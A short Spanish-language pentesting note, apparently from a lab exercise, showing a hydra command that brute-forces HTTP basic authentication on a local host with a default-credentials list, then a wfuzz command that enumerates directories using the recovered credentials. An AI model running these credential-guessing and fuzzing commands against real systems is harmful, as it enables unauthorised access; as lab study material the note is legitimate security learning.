
![[Pasted image 20250715180411.png]]

Vamos a usar un diccionario de seclists que contenga usuarios y contraseñas de la siguiente forma `user:pass`, en este caso estaremos haciendo uso del siguiente diccionario de credenciales por defecto `/usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`.

```
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.3 -s 80 http-get /
```

![[Pasted image 20250715180750.png]]

Ahora, si queremos aplicar fuzzing, lo podemos hacer de la siguiente manera:

```
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --basic httpadmin:fhttpadmin -z list,php,txt,html,xml --hc=401,404 -u "http://172.17.0.3/FUZZ.FUZ2Z"
```


